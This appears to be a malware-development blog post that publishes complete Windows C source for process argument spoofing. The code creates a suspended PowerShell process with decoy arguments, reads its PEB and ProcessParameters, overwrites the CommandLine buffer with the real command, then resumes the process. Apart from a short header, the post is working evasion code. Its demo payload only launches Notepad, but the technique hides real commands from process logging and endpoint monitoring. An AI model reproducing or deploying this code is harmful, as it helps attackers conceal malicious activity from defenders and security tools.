---
title: "ProcessArgumentSpoofing"
date: 2026-06-11 00:00:00 +0100
categories: [Malware, Development]
tags:
  - malware
  - code
---

# ProcessArgumentSpoofing

**Folder:** `ProcessArgumentSpoofing`

## ProcArgSpoofing.c

```c
#include <stdio.h>
#include "structs.h"

#pragma warning (disable:4996)

#define STARTUP_ARGS L"powershell.exe N0xshell"
#define REAL_ARGS L"powershell.exe -c notepad.exe"


/*
	Reads data from remote (target process)
		hProcess -> Handle to remote process
		pAddress -> Pointer to memory address of remote process to read from
		ppReadBuffer -> Pointer to memory locatation
		dwBufferSize -> DWORD holds size of the remote process
*/
BOOL ReadRemoteProcess(_In_ HANDLE hProcess, _In_ PVOID pAddress, _Out_ PVOID* ppReadBuffer, _In_ DWORD dwBufferSize) {
	
	SIZE_T sNumberOfBytesRead = 0;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNumberOfBytesRead) || sNumberOfBytesRead != dwBufferSize) {
		printf("[!] ReadProcessMemory Failed %d \n", GetLastError());
		printf("[!] Bytes Read: %d of %d \n", sNumberOfBytesRead, dwBufferSize);
		return FALSE;
	}
	return TRUE;
}

BOOL WriteRemoteProcess(_In_ HANDLE hProcess, _In_ PVOID pAddress, _In_ PVOID pBuffer, _In_ DWORD dwBufferSize) {
	
	SIZE_T sNumbersBytesWritten = 0;

	if (!WriteProcessMemory(hProcess, pAddress, pBuffer, dwBufferSize, &sNumbersBytesWritten) || sNumbersBytesWritten != dwBufferSize) {
		printf("[!] WriteProcessMemory Failed %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL PatchArguments(_In_ LPWSTR szStartupArgs, _In_ LPWSTR szMaliciousArgs, _Out_ DWORD* dwProcID, _Out_ HANDLE* hProcess, _Out_ HANDLE* hThread) {

	NTSTATUS						STATUS = NULL;
	WCHAR							szProcess[MAX_PATH];
	STARTUPINFOW					Si = { 0 };
	PROCESS_INFORMATION				Pi = { 0 };

	PROCESS_BASIC_INFORMATION		PBI = { 0 };
	ULONG							uRetern = NULL;
	PPEB							pPeb = NULL;
	PRTL_USER_PROCESS_PARAMETERS	pParms = NULL;

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);


	// Function pointer, telling the compiler where the address of the function begins
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL)
		return FALSE;

	// Copy StarupArgs into szProcess
	lstrcpyW(szProcess, szStartupArgs);

	wprintf(L"[+] Running: \"%s\"  \n", szProcess);

	// Creating suspended process with our arguments
	if (!CreateProcessW(NULL, szProcess, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, L"c:\\ProgramData\\", &Si, &Pi)) {
		printf("[!] CreateProcessW Failed %d \n", GetLastError());
		return FALSE;
	}
	else
		printf("[+] Successfully Created Process With PID: %d \n", Pi.dwProcessId);

	// Getting the `PROCESS_BASIC_INFORMATION` structure of the remote process (that contains the peb address)
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
		printf("\t[!] NtQueryInformationProcess Failed 0x%0.8X \n", STATUS);
		return FALSE;
	}

	// Reading the `peb` structure from its base address in the remote process
	if (!ReadRemoteProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
		printf("[!] Failed To Read Target's Process Peb \n");
		return FALSE;
	}

	// Reading the `ProcessParameters` structure from the peb of the remote process
	// We read extra `0xFF` bytes to insure we have reached the CommandLine.Buffer pointer
	if (!ReadRemoteProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		printf("[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}

	// Update cmdline with our command
	wprintf(L"[+] Writing \"%s\" As Process Argument At 0x%p \n", szMaliciousArgs, pParms->CommandLine.Buffer);

	/*
		Pi.Process -> Handle to target process
		pParms->CommandLine.Buffer -> Points to RTL_USER_PROCESS_PARAMETERS inside target process, copies over are intended command into remote process
		szMaliciousArgs -> our command
		lstrlenW -> determines how much bytes we copy (+ 1, add extra byte (null byte))
	*/
	if (!WriteRemoteProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szMaliciousArgs, (DWORD)(lstrlenW(szMaliciousArgs) + 1) * sizeof(WCHAR))) {
		printf("[!] WriteRemoteProcess Failed \n");
		return FALSE;
	}

	// Clean up heap (prevents memory leak)
	HeapFree(GetProcessHeap(), 0, pPeb);
	HeapFree(GetProcessHeap(), 0, pParms);

	// Resume suspended thread
	ResumeThread(Pi.hThread);

	// Dereference output parameters
	*dwProcID = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	if (*dwProcID != 0 && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;

}

int main() {
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD dwProcID = NULL;

	wprintf(L"[+] Target Process  Will Be Created With [Startup Arguments] \"%s\" \n", STARTUP_ARGS);
	wprintf(L"[+] The Actual Arguments [Payload Argument] \"%s\" \n", REAL_ARGS);

	if (!PatchArguments(STARTUP_ARGS, REAL_ARGS, &dwProcID, &hProcess, &hThread)) {
		return -1;
	}

	printf("[+] Press <Enter> To Exit! \n");
	getchar();

	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}
```

---

## structs.h

```c
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE,
    PROCESSINFOCLASS,
    PVOID,
    ULONG,
    PULONG
    );

```

---

